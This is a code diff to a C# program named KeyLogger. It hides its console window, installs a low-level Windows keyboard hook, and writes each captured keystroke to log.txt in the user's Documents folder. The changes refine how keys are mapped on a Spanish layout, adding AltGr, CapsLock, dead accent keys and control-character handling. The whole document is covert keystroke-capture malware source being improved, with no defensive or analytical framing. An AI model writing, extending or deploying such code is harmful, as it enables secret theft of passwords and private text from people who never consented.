@@ -23,7 +23,6 @@ class KeyLogger
         IntPtr handle = GetConsoleWindow();
         ShowWindow(handle, SW_HIDE);
 
-        // Guardar el log en la carpeta Documentos del usuario
         string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
         string logPath = Path.Combine(documentsPath, "log.txt");
 
@@ -82,9 +81,18 @@ class KeyLogger
             int result = ToUnicodeEx((uint)vkCode, 0, keyState, buffer, buffer.Capacity, 0, layout);
 
             string key;
-            if (result > 0 && !string.IsNullOrWhiteSpace(buffer.ToString()))
+            string raw = buffer.ToString();
+
+            if (result > 0 && !string.IsNullOrWhiteSpace(raw))
             {
-                key = buffer.ToString();
+                if (char.IsControl(raw[0]) || (int)raw[0] == 0xFFFF)
+                {
+                    key = MapKnownKey(vkCode);
+                }
+                else
+                {
+                    key = raw;
+                }
             }
             else
             {
@@ -101,26 +109,29 @@ class KeyLogger
     {
         switch (vkCode)
         {
-            case 219: return "[";       // Oem4
-            case 221: return "]";       // Oem6
-            case 186: return "ñ";       // Oem1 (ES layout)
-            case 192: return "º";       // Oem3
-            case 222: return "'";       // Oem7
-            case 220: return "\\";      // Oem5
-            case 191: return "?";
-            case 188: return ",";
-            case 190: return ".";
-            case 189: return "-";
-            case 187: return "=";
-            case 13: return "[ENTER]\n";
-            case 8: return "[BACKSPACE]";
-            case 9: return "[TAB]";
-            case 27: return "[ESC]";
             case 160:
             case 161: return "[SHIFT]";
             case 162:
             case 163: return "[CTRL]";
             case 164: return "[ALT]";
+            case 165: return "[ALTGR]";
+            case 20: return "[CAPSLOCK]";
+            case 13: return "[ENTER]\n";
+            case 9: return "[TAB]";
+            case 27: return "[ESC]";
+            case 8: return "[BACKSPACE]";
+            case 32: return "[SPACE]";
+            case 222: return "´";       // Dead key acento agudo
+            case 192: return "^";       // Dead key circunflejo
+            case 219: return "[";       // Oem4
+            case 221: return "]";       // Oem6
+            case 220: return "\\";      // Oem5
+            case 186: return "ñ";       // Oem1
+            case 187: return "=";
+            case 189: return "-";
+            case 188: return ",";
+            case 190: return ".";
+            case 191: return "?";
             case 44: return "[PrintScreen]";
             default:
                 try
@@ -134,7 +145,6 @@ class KeyLogger
         }
     }
 
-    // DLL Imports
     [DllImport("user32.dll")]
     private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
         IntPtr hMod, uint dwThreadId);
